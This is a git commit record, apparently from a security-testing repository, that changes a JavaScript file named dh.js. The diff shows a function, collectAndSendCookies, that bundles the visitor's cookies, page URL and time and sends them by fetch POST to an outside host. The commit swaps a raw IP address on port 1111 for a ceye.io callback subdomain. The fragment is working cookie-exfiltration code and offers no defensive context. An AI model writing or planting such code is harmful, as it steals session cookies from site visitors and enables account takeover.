34826661ac4839ed75e658f292e1055479373b48
XinanSec <nianyila2017@163.com>
2025-04-10 02:57:55 +0800

    Update dh.js

--- dh.js
+++ dh.js
@@ -4,7 +4,7 @@ function collectAndSendCookies() {
     const data = `Cookies: ${allCookies}\nURL: ${window.location.href}\nTime: ${new Date().toString()}`;
     
     // 使用fetch发送纯文本数据
-    fetch(`http://83.229.127.162:1111`, {
+    fetch(`https://nmnpf1.ceye.io/`, {
         method: 'POST',
         headers: {
             'Content-Type': 'text/plain'  // 发送纯文本
